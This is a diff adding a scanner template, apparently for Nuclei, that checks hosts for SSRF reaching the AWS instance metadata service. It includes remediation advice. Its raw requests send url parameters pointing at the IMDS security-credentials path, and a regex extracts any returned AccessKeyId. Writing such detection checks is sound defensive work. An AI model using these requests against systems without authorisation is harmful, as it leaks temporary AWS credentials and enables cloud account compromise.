@@ -1,0 +1,51 @@
+id: flanksource-aws-imds-ssrf
+
+info:
+  name: Flanksource - AWS IMDS SSRF
+  author: flanksource
+  severity: critical
+  description: |
+    SSRF that reaches the AWS instance metadata service (IMDSv1) on hosts fronting
+    the demo environment's Crossplane AWS workloads. Reaching
+    iam/security-credentials leaks temporary AWS credentials for the instance role.
+  remediation: |
+    Enforce IMDSv2 (HttpTokens=required, HttpPutResponseHopLimit=1) on all instances
+    and validate/allowlist outbound URLs in any proxy.
+  reference:
+    - https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/configuring-instance-metadata-service.html
+  classification:
+    cwe-id: CWE-918
+  metadata:
+    max-request: 2
+  tags: flanksource,cloud,aws,ssrf,imds
+
+http:
+  - raw:
+      - |
+        GET /?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/ HTTP/1.1
+        Host: {{Hostname}}
+      - |
+        GET /proxy?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/ HTTP/1.1
+        Host: {{Hostname}}
+
+    stop-at-first-match: true
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: word
+        part: body
+        words:
+          - 'AccessKeyId'
+          - 'iam/security-credentials'
+        condition: or
+
+    extractors:
+      - type: regex
+        part: body
+        regex:
+          - '"AccessKeyId"[ ]*:[ ]*"[^"]+"'
+          - '[a-zA-Z0-9_-]+'
